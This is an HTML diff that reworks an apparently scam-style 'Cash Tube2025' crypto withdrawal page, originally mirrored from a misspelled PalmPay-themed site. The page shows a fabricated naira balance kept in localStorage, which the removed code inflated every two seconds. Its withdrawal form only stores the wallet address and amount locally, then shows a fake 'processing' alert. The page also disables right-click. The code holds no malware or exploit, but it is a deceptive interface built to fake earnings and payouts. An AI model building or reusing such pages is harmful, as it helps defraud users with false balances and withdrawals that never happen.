@@ -1,391 +1,574 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from allappsreveiws.com.ng/palmpay/home.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Sep 2023 21:11:55 GMT -->
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
-    <title>hello</title>
-</head>
-<body>
-    <style>
-             @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;900&amp;display=swap');
-        /* Styles remain the same as before */
-   * {
-            margin: 0;
-            padding: 0;
-            font-family: 'Poppins', sans-serif;
-        }
-        body {
-            background: #efeded;
-        }
-        .box {
-            width: 95%;
-            height: 150px;
-            margin: 0 auto;
-            background: #ffffff;
-            border-radius: 8px;
-            border: 1px solid  #ffffff;
-            border-radius: 9px;
-            
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Crypto Withdraw · Cash Tube2025</title>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
 
-        }
-        .money{
-            width: 95%;
-            height: 150px;
-            margin: 0 auto;
-            background:   green;
-            border-radius: 8px;
-            color: white;
-            padding-top: 10px;
-        }
-        .money p, h2 {
-            padding-left: 19px;
-        }
-        .input-container {
-            position: relative;
-            margin-bottom: 20px;
-        }
+    body {
+      background: #f0f2f8;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 0 90px 0;
+    }
 
-        .input-container input,
-        .input-container textarea {
-            border: none;
-            border-bottom: 2px solid #000;
-            background: white;
-            outline: none;
-            padding: 5px 0;
-            font-size: 16px;
-            width: 90%;
-            margin: 0 auto;
-            display: block;
-        }
+    /* Animated Gradient Header */
+    #gradient {
+      width: 100%;
+      max-width: 480px;
+      height: 160px;
+      border-radius: 0 0 40px 40px;
+      padding: 30px 24px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
 
-        .input-container input:focus,
-        .input-container textarea:focus {
-            border-bottom-color: green;
-        }
+    .header-content {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
 
-        .input-container label {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            pointer-events: none;
-            transition: 0.2s ease all;
-            font-size: 16px;
-        }
+    .header-content .avatar {
+      width: 56px;
+      height: 56px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      color: white;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+    }
 
-        .input-container input:focus ~ label,
-        .input-container textarea:focus ~ label,
-        .input-container input:valid ~ label,
-        .input-container textarea:valid ~ label {
-            transform: translateY(-29px);
-            font-size: 14px;
-            color: green;
-        }
+    .header-content .user-info h2 {
+      font-size: 18px;
+      font-weight: 700;
+      color: white;
+    }
 
-        label {
-            padding-left: 17px;
-        }
-        .form {
-            width: 95%;
-            height: 320px;
-            margin: 0 auto;
-            /* background-color: rgb(172, 145, 145); */
-            border-radius: 10px;
-            border: 1px solid   green;
-            background: #ffffff;
-        }
-        button {
-            width: 40%;
-        height: 40px;
-        margin: 0 auto;
-        display: block;
-        background:   green;
-        font-size: 22px;
-        color: white;
+    .header-content .user-info p {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.8);
+    }
 
-        }
+    /* Back Link */
+    .back-link {
+      width: 100%;
+      max-width: 480px;
+      padding: 16px 20px 0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
 
-        .bottom-menu {
+    .back-link a {
+      color: #4b5563;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: 0.2s;
+    }
+
+    .back-link a:hover {
+      color: #7c3aed;
+    }
+
+    /* Balance Card */
+    .balance-card {
+      width: 100%;
+      max-width: 480px;
+      margin: 8px 16px 16px;
+      padding: 20px;
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .balance-card .balance-info .label {
+      font-size: 13px;
+      color: #94a3b8;
+      font-weight: 500;
+    }
+
+    .balance-card .balance-info .amount {
+      font-size: 28px;
+      font-weight: 800;
+      color: #0f172a;
+    }
+
+    .balance-card .balance-info .amount span {
+      color: #7c3aed;
+    }
+
+    .balance-card .crypto-badge {
+      background: #fef3c7;
+      color: #d97706;
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .balance-card .crypto-badge i {
+      font-size: 14px;
+    }
+
+    /* Form Card */
+    .form-card {
+      width: 100%;
+      max-width: 480px;
+      margin: 0 16px 16px;
+      padding: 24px 20px;
+      background: #ffffff;
+      border-radius: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+      border: 1px solid #f1f5f9;
+    }
+
+    .form-card .form-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0f172a;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .form-card .form-title i {
+      color: #f7931a;
+    }
+
+    .form-card .form-title .sub {
+      font-size: 13px;
+      font-weight: 400;
+      color: #94a3b8;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #475569;
+      margin-bottom: 4px;
+    }
+
+    .input-group label i {
+      color: #7c3aed;
+      width: 18px;
+    }
+
+    .input-group select,
+    .input-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid #e2e8f0;
+      border-radius: 14px;
+      font-size: 15px;
+      transition: 0.2s;
+      background: #f8fafc;
+      outline: none;
+      appearance: none;
+      -webkit-appearance: none;
+      color: #0f172a;
+    }
+
+    .input-group select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2364748b' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+      cursor: pointer;
+    }
+
+    .input-group select:focus,
+    .input-group input:focus {
+      border-color: #7c3aed;
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.08);
+    }
+
+    .input-group select option {
+      padding: 10px;
+    }
+
+    .btn-withdraw {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 14px;
+      background: linear-gradient(145deg, #f7931a, #e67e22);
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 8px 24px -6px rgba(247, 147, 26, 0.35);
+      margin-top: 4px;
+    }
+
+    .btn-withdraw:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 32px -8px rgba(247, 147, 26, 0.4);
+    }
+
+    .btn-withdraw:active {
+      transform: scale(0.97);
+    }
+
+    .btn-withdraw i {
+      font-size: 18px;
+    }
+
+    /* Info Box */
+    .info-box {
+      width: 100%;
+      max-width: 480px;
+      padding: 0 16px;
+      margin-bottom: 10px;
+    }
+
+    .info-box .info-content {
+      background: #f8fafc;
+      border-radius: 16px;
+      padding: 16px 20px;
+      border-left: 4px solid #f7931a;
+    }
+
+    .info-box .info-content p {
+      font-size: 13px;
+      color: #475569;
+      line-height: 1.6;
+    }
+
+    .info-box .info-content p i {
+      color: #f7931a;
+      margin-right: 6px;
+    }
+
+    .info-box .info-content .highlight {
+      color: #7c3aed;
+      font-weight: 700;
+    }
+
+    /* Bottom Menu */
+    .bottom-menu {
       position: fixed;
       bottom: 0;
       left: 0;
       width: 100%;
-      background-color:     green;
-      color: #fff;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border-top: 1px solid rgba(0, 0, 0, 0.05);
       display: flex;
       justify-content: space-around;
       align-items: center;
-      padding: 10px;
+      padding: 12px 10px 16px;
       z-index: 999;
     }
 
     .bottom-menu a {
-      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #94a3b8;
       text-decoration: none;
-      font-weight: bold;
+      font-size: 11px;
+      font-weight: 600;
+      gap: 2px;
+      transition: 0.2s;
     }
-    .slider {
-  width: 100%;
-  overflow: hidden;
-}
 
-.slide {
-  display: none;
-}
+    .bottom-menu a i {
+      font-size: 20px;
+    }
 
-.slide.active {
-  display: block;
-}
+    .bottom-menu a.active {
+      color: #7c3aed;
+    }
 
-.slide img {
-  width: 100%;
-  height: 150px;
-}
+    .bottom-menu a.active i {
+      background: #ede9fe;
+      padding: 6px 14px;
+      border-radius: 30px;
+    }
 
-g { color: red;
+    /* Responsive */
+    @media (max-width: 480px) {
+      #gradient {
+        height: 140px;
+        padding: 20px 18px;
+      }
+      .header-content .avatar {
+        width: 46px;
+        height: 46px;
+        font-size: 20px;
+      }
+      .header-content .user-info h2 {
+        font-size: 16px;
+      }
+      .balance-card .balance-info .amount {
+        font-size: 22px;
+      }
+      .form-card {
+        padding: 18px 16px;
+      }
+      .input-group select,
+      .input-group input {
+        padding: 12px 14px;
+        font-size: 14px;
+      }
+      .btn-withdraw {
+        padding: 14px;
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
 
-}
-.top {
-    width: 100%;
-    height: fit-content;
-    background: none;
-}
-.top img {
-    width: 80px;
-    padding-left: 12px;
-    padding-top: 40px;
-    color: none;
-}
-.top p {
-    position: relative;
-    top: -56px;
-    padding-left: 96px;
-    font-size: 20px;
-    background: none;
-}
-
-
-    body{
-     background-color: #000000;
-   padding: 0px;
-   margin: 0px;
- }
-
-#gradient
-{
-  width: 100%;
-  height: auto;
-  padding: 0px;
-  margin: 0px;
-}
-    </style>
-    
-    <div id="gradient" />
- <div class="top">
-        <img src="img/top.png" alt="">
-        <p><b>Hello, Valid User</b></p>
-        <p>Good Day.</p>
-   </div> 
-
-   
-        
+  <!-- Animated Gradient Header -->
+  <div id="gradient">
+    <div class="header-content">
+      <div class="avatar"><i class="fab fa-bitcoin"></i></div>
+      <div class="user-info">
+        <h2>Crypto Withdrawal</h2>
+        <p>Withdraw your earnings in cryptocurrency</p>
+      </div>
     </div>
-    <br><br>
-    <div class="form"> <br>
-        <form id="#">
-            <div class="input-container">
-                <center>
-              <select aria-label="الجنس" name="birthday_year" required id="year" title="الجنس" class="_5dba" style="
-    width: 330px;
-    height: 56px;
-">
-<option value="أختر نوع الشبكة" selected="1">---SELECT CRYPTO TYPE ---</option>
-  <option value="1">Bitcoin - B.T.C </option>
-<option value="2">Tether - U.S.D.T  </option>
-<option value="2">Ethereum - E.T.H </option>
-<option value="2">Binance - B.N.B </option>  
-</select></center>
-            </div>
-            <div class="input-container">
-              <input type="text" id="palmpayName" name="palmpayName" required placeholder="">
-              <label for="palmpayName">Wallet Address</label>
-            </div>
-            <div class="input-container">
-              <input type="text" id="palmpayCome" name="palmpayCome" required placeholder="">
-              <label for="palmpayCome">Amount in NGN</label>
-            </div>
-            <br>
-            <button type="submit">Withdraw</button> 
-          </form>
-          
-    </div> <br> <br> <br>
+  </div>
 
-      <script>
-                   // JavaScript to handle menu interactions (optional)
-    // You can add functionality such as active menu item highlighting or additional menu actions
+  <!-- Back Link -->
+  <div class="back-link">
+    <a href="home.html"><i class="fas fa-arrow-left"></i> Back to Dashboard</a>
+    <a href="home.html" style="color: #dc2626;"><i class="fas fa-times"></i> Close</a>
+  </div>
 
-    // Example: Add an "active" class to the currently selected menu item
-    const menuItems = document.querySelectorAll('.bottom-menu a');
+  <!-- Balance Card -->
+  <div class="balance-card">
+    <div class="balance-info">
+      <div class="label">Available Balance</div>
+      <div class="amount">₦<span id="number">7,600</span></div>
+    </div>
+    <div class="crypto-badge">
+      <i class="fas fa-coins"></i> Crypto Ready
+    </div>
+  </div>
 
-menuItems.forEach((item) => {
-  item.addEventListener('click', () => {
-    menuItems.forEach((menuItem) => {
-      menuItem.classList.remove('active');
+  <!-- Form Card -->
+  <div class="form-card">
+    <div class="form-title">
+      <i class="fab fa-bitcoin"></i> Withdraw Crypto
+      <span class="sub">— Select your preferred currency</span>
+    </div>
+
+    <form id="cryptoForm">
+      <div class="input-group">
+        <label><i class="fas fa-coins"></i> Select Cryptocurrency</label>
+        <select id="cryptoType" name="cryptoType" required>
+          <option value="">--- SELECT CRYPTO TYPE ---</option>
+          <option value="Bitcoin">₿ Bitcoin - B.T.C</option>
+          <option value="Tether">₮ Tether - U.S.D.T</option>
+          <option value="Ethereum">⟠ Ethereum - E.T.H</option>
+          <option value="Binance">🟡 Binance - B.N.B</option>
+        </select>
+      </div>
+
+      <div class="input-group">
+        <label><i class="fas fa-wallet"></i> Wallet Address</label>
+        <input type="text" id="walletAddress" name="walletAddress" placeholder="Enter your crypto wallet address" required>
+      </div>
+
+      <div class="input-group">
+        <label><i class="fas fa-naira-sign"></i> Amount in NGN</label>
+        <input type="number" id="amountNGN" name="amountNGN" placeholder="Enter amount to withdraw" required>
+      </div>
+
+      <button type="submit" class="btn-withdraw">
+        <i class="fas fa-paper-plane"></i> Withdraw Crypto
+      </button>
+    </form>
+  </div>
+
+  <!-- Info Box -->
+  <div class="info-box">
+    <div class="info-content">
+      <p>
+        <i class="fas fa-info-circle"></i> 
+        Your withdrawal will be processed within <span class="highlight">24 hours</span>. 
+        Make sure you enter the correct wallet address. Crypto withdrawals are final and cannot be reversed.
+      </p>
+    </div>
+  </div>
+
+  <!-- Bottom Menu -->
+  <div class="bottom-menu">
+    <a href="index.html"><i class="fas fa-home"></i><span>Home</span></a>
+    <a href="about.html"><i class="fas fa-info-circle"></i><span>About</span></a>
+    <a href="contact.html" class="active"><i class="fas fa-envelope"></i><span>Contact</span></a>
+  </div>
+
+  <script>
+    // Disable right-click
+    document.addEventListener('contextmenu', function(event) {
+      event.preventDefault();
     });
 
-    item.classList.add('active');
-  });
-});
+    // ---------- ANIMATED GRADIENT ----------
+    var colors = new Array(
+      [62,35,255],
+      [60,255,60],
+      [255,35,98],
+      [45,175,230],
+      [255,0,255],
+      [255,128,0]
+    );
 
-function startSlider() {
-  const slides = document.querySelectorAll('.slide');
-  let currentSlide = 0;
+    var step = 0;
+    var colorIndices = [0,1,2,3];
+    var gradientSpeed = 0.002;
 
-  function showSlide() {
-    slides[currentSlide].classList.remove('active');
-    currentSlide = (currentSlide + 1) % slides.length;
-    slides[currentSlide].classList.add('active');
-  }
+    function updateGradient() {
+      if ($ === undefined) return;
+      
+      var c0_0 = colors[colorIndices[0]];
+      var c0_1 = colors[colorIndices[1]];
+      var c1_0 = colors[colorIndices[2]];
+      var c1_1 = colors[colorIndices[3]];
 
-  setInterval(showSlide, 3000); // Change slide every 3 seconds
-}
+      var istep = 1 - step;
+      var r1 = Math.round(istep * c0_0[0] + step * c0_1[0]);
+      var g1 = Math.round(istep * c0_0[1] + step * c0_1[1]);
+      var b1 = Math.round(istep * c0_0[2] + step * c0_1[2]);
+      var color1 = "rgb("+r1+","+g1+","+b1+")";
 
-startSlider();
+      var r2 = Math.round(istep * c1_0[0] + step * c1_1[0]);
+      var g2 = Math.round(istep * c1_0[1] + step * c1_1[1]);
+      var b2 = Math.round(istep * c1_0[2] + step * c1_1[2]);
+      var color2 = "rgb("+r2+","+g2+","+b2+")";
 
-        // Get the element where the number will be displayed
-        const numberElement = document.getElementById('number');
+      $('#gradient').css({
+        background: "-webkit-gradient(linear, left top, right top, from("+color1+"), to("+color2+"))"
+      }).css({
+        background: "-moz-linear-gradient(left, "+color1+" 0%, "+color2+" 100%)"
+      });
+      
+      step += gradientSpeed;
+      if (step >= 1) {
+        step %= 1;
+        colorIndices[0] = colorIndices[1];
+        colorIndices[2] = colorIndices[3];
+        colorIndices[1] = (colorIndices[1] + Math.floor(1 + Math.random() * (colors.length - 1))) % colors.length;
+        colorIndices[3] = (colorIndices[3] + Math.floor(1 + Math.random() * (colors.length - 1))) % colors.length;
+      }
+    }
 
-        // Check if the number exists in localStorage
-        let number = localStorage.getItem('number');
+    setInterval(updateGradient, 10);
 
-        // If the number doesn't exist, set it to 0
-        if (!number) {
-            number = 7600;
-        }
+    // ---------- BALANCE ----------
+    const numberElement = document.getElementById('number');
+    let number = parseInt(localStorage.getItem('number')) || 7600;
 
-        // Function to update the number
-        function updateNumber() {
-            number = parseInt(number) + 164;
-            numberElement.textContent = formatNumber(number);
+    function formatNumber(num) {
+      return num.toLocaleString('en-US');
+    }
 
-            // Store the updated number in localStorage
-            localStorage.setItem('number', number);
-        }
+    numberElement.textContent = formatNumber(number);
 
-        // Function to format the number with commas and decimal places
-        function formatNumber(number) {
-            return number.toLocaleString('en-US');
-        }
+    // ---------- FORM SUBMISSION ----------
+    document.getElementById('cryptoForm').addEventListener('submit', function(event) {
+      event.preventDefault();
 
-        // Update the number initially
-        updateNumber();
+      const cryptoType = document.getElementById('cryptoType').value;
+      const walletAddress = document.getElementById('walletAddress').value.trim();
+      const amountNGN = document.getElementById('amountNGN').value.trim();
 
-        // Call the updateNumber function every 5 minutes (300,000 milliseconds)
-        setInterval(updateNumber, 2000);
+      if (!cryptoType) {
+        alert('Please select a cryptocurrency type.');
+        return;
+      }
 
-        document.getElementById('fundForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent form submission
+      if (!walletAddress) {
+        alert('Please enter your wallet address.');
+        return;
+      }
 
-    const palmpayNumber = document.getElementById('palmpayNumber').value;
-    const palmpayName = document.getElementById('palmpayName').value;
-    const palmpayCome = document.getElementById('palmpayCome').value;
-    const amount = document.getElementById('amount').value;
+      if (!amountNGN || parseInt(amountNGN) <= 0) {
+        alert('Please enter a valid amount.');
+        return;
+      }
 
-    // Store form data in localStorage
-    localStorage.setItem('palmpayNumber', palmpayNumber);
-    localStorage.setItem('palmpayName', palmpayName);
-    localStorage.setItem('palmpayCome', palmpayCome);
-    localStorage.setItem('amount', amount);
+      if (parseInt(amountNGN) > parseInt(number)) {
+        alert('Insufficient balance! Your available balance is ₦' + formatNumber(number));
+        return;
+      }
 
-    // Navigate to the next page
-    window.location.href = '#';
-  });
-      </script>
+      // Store form data in localStorage
+      localStorage.setItem('cryptoType', cryptoType);
+      localStorage.setItem('walletAddress', walletAddress);
+      localStorage.setItem('cryptoAmount', amountNGN);
 
+      // Show processing message
+      alert('🔄 Processing your crypto withdrawal to ' + cryptoType + ' wallet...\n\n' +
+            'Amount: ₦' + formatNumber(parseInt(amountNGN)) + '\n' +
+            'Wallet: ' + walletAddress.substring(0, 8) + '...' + walletAddress.substring(walletAddress.length - 4) + '\n\n' +
+            'Please wait for confirmation.');
 
-<!-- Start of LiveChat (www.livechat.com) code -->
-<script>
-  window.__lc = window.__lc || {};
-  window.__lc.license = 15808029;
-  ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="../../cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
-</script>
-<noscript><a href="https://www.livechat.com/chat-with/15808029/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
-<!-- End of LiveChat code -->
-<script>
+      // Navigate to next page
+      // window.location.href = 'next-page.html';
+    });
+
+    // ---------- BOTTOM MENU ACTIVE ----------
+    const menuItems = document.querySelectorAll('.bottom-menu a');
+    menuItems.forEach((item) => {
+      item.addEventListener('click', function() {
+        menuItems.forEach((menuItem) => {
+          menuItem.classList.remove('active');
+        });
+        this.classList.add('active');
+      });
+    });
+
+    // ---------- LIVECHAT (kept from original) ----------
     window.__lc = window.__lc || {};
     window.__lc.license = 15808029;
-    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="../../cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
-</script>
-<script>
-    
-var colors = new Array(
-  [62,35,255],
-  [60,255,60],
-  [255,35,98],
-  [45,175,230],
-  [255,0,255],
-  [255,128,0]);
+    (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice));
+  </script>
+  <noscript><a href="https://www.livechat.com/chat-with/15808029/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 
-var step = 0;
-//color table indices for: 
-// current color left
-// next color left
-// current color right
-// next color right
-var colorIndices = [0,1,2,3];
-
-//transition speed
-var gradientSpeed = 0.002;
-
-function updateGradient()
-{
-  
-  if ( $===undefined ) return;
-  
-var c0_0 = colors[colorIndices[0]];
-var c0_1 = colors[colorIndices[1]];
-var c1_0 = colors[colorIndices[2]];
-var c1_1 = colors[colorIndices[3]];
-
-var istep = 1 - step;
-var r1 = Math.round(istep * c0_0[0] + step * c0_1[0]);
-var g1 = Math.round(istep * c0_0[1] + step * c0_1[1]);
-var b1 = Math.round(istep * c0_0[2] + step * c0_1[2]);
-var color1 = "rgb("+r1+","+g1+","+b1+")";
-
-var r2 = Math.round(istep * c1_0[0] + step * c1_1[0]);
-var g2 = Math.round(istep * c1_0[1] + step * c1_1[1]);
-var b2 = Math.round(istep * c1_0[2] + step * c1_1[2]);
-var color2 = "rgb("+r2+","+g2+","+b2+")";
-
- $('#gradient').css({
-   background: "-webkit-gradient(linear, left top, right top, from("+color1+"), to("+color2+"))"}).css({
-    background: "-moz-linear-gradient(left, "+color1+" 0%, "+color2+" 100%)"});
-  
-  step += gradientSpeed;
-  if ( step >= 1 )
-  {
-    step %= 1;
-    colorIndices[0] = colorIndices[1];
-    colorIndices[2] = colorIndices[3];
-    
-    //pick two new target color indices
-    //do not pick the same as the current one
-    colorIndices[1] = ( colorIndices[1] + Math.floor( 1 + Math.random() * (colors.length - 1))) % colors.length;
-    colorIndices[3] = ( colorIndices[3] + Math.floor( 1 + Math.random() * (colors.length - 1))) % colors.length;
-    
-  }
-}
-
-setInterval(updateGradient,10);
-</script>
-<noscript><a href="https://www.livechat.com/chat-with/15808029/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
-
-    </body>
-
-<!-- /Chatra {/literal} -->
-    
-<!-- Mirrored from allappsreveiws.com.ng/palmpay/home.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Sep 2023 21:11:58 GMT -->
+</body>
 </html>
